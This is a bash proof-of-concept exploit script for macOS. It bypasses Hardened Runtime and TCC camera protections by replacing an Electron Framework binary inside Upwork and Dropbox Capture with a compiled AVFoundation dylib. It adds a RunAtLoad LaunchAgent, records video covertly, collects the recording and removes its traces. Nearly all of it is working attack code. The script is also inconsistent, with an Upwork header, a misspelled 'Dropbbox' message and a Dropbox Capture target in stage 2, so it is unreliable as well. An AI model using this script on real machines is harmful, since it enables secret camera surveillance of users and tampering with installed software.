...
```bash
########################################################################################################################
echo "[i] Upwork 5.8.0.33 Hardened Runtime + TCC Bypass Camera Recording via rpath Hijacking"
#!/bin/bash
########################################################################################################################
# STAGE 1 [DEMO] #######################################################################################################
echo "[i] Creating base poc file"

DEMO_NAME=runtime_tcc_bypass_demo
APPLICATION_BASE_PATH=/Applications/Upwork.app
APPLICATION_FULL_PATH=/Applications/Upwork.app/Contents/MacOS/Upwork
...
echo "[i] Creating backup of Electron Framework"
cp -R $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og

echo "[i] Moving the dylib example to the rpath hijack location"
mv $DEMO_NAME.dylib $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework

echo "[i] Spawning \"Dropbbox Capture\" and demoing rpath hijack"
$APPLICATION_FULL_PATH

echo "[i] Cleaning up"
cp -R $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework
rm -rf $APPLICATION_BASE_PATH/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og
...
# #########################################################################################################################
# ## STAGE 2 [EXPLOIT] ####################################################################################################
echo "[i] Killing Dropbox Capture"
killall "Dropbox Capture" 2>/dev/null

echo "[i] Compiling exploit dylib hijack"
EXPLOIT_NAME=dropbox_capture_helper_Renderer_rpath_injection_tcc_bypass
gcc -dynamiclib -framework Foundation -framework AVFoundation $EXPLOIT_NAME.m -o $EXPLOIT_NAME.dylib

echo "[i] Creating backup of Electron Framework"
cp -R /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og

echo "[i] Moving the dylib to the rpath hijack"
mv $EXPLOIT_NAME.dylib /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework

echo "[i] Creating ~/Library/LaunchAgents/ if it doesn't exist"
mkdir ~/Library/LaunchAgents/ 2>/dev/null

echo "[i] Creating LaunchAgent plist in ~/Library/LaunchAgents/"
PLIST="com.dropbox.capture.helper.Renderer.launcher.plist"
cat << EOF > ~/Library/LaunchAgents/$PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>Label</key>
		<string>com.dropbox.capture.helper.Renderer.launcher</string>
		<key>ProgramArguments</key>
		<array>
			<string>/Applications/Dropbox Capture.app/Contents/Frameworks/Dropbox Capture Helper (Renderer).app/Contents/MacOS/Dropbox Capture Helper (Renderer)</string>
		</array>
		<key>RunAtLoad</key>
		<true/>
		<key>StandardOutPath</key>
		<string>/tmp/dropbox_capture_helper_Renderer.log</string>
		<key>StandardErrorPath</key>
		<string>/tmp/dropbox_capture_helper_Renderer.log</string>
	</dict>
</plist>
...
echo "[i] Viewing the logfile"
cat /tmp/dropbox_capture_helper_Renderer.log

echo "[i] Copying video to current directory"
vid_path=$(cat /tmp/dropbox_capture_helper_Renderer.log | grep "Saved" | cut -d ']' -f 2 | cut -d ' ' -f 7)
mv $vid_path . 

echo "[i] Cleaning up"
echo "    [i] Replacing hijack Electron Framework with the original copy "
cp -R /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework

echo "    [i] Removing the copy of Electron Framework"
rm -rf /Applications/Dropbox\ Capture.app/Contents/Frameworks/Electron\ Framework.framework/Electron\ Framework.og

echo "    [i] Removing the LaunchAgents plist"
rm -rf ~/Library/LaunchAgents/$PLIST

echo "    [i] Removing the log file"
rm -rf /tmp/dropbox_capture_helper_Renderer.log 2>/dev/null

echo "    [i] Removing the base_poc.m"
rm -rf base_poc.m

echo "[i] Opening the recorded video"
open dropbox_capture_helper_Renderer_recording.mov
########################################################################################################################
